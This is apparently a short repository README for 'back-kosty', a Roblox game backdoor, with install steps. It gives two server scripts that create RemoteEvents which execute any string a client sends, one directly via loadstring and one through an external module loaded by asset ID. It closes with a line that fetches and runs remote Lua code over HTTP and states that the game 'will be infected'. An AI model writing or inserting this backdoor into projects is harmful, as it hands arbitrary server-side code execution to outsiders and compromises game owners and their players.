# back-kosty
repository of my backdoor for test also this so epic :D
# how to install?
create in serverscriptservice the 2 scripts
# stape number 1
local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
backdoor.Name = "back-kosty"
backdoor.OnServerEvent:connect(function(player, SS)
	loadstring(SS)()
end)

# stape 2

local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
backdoor.Name = "polaria"

backdoor.OnServerEvent:Connect(function(player, SS)
	local module = require(123255432303221)
	if type(SS) == "string" then
		module:Pload(SS)
	else
		warn("polaria failed")
	end
end)

# after that your game will be infected by back-kosty
# loadstring 1
loadstring(game:HttpGet("https://example.com/script.lua"))()
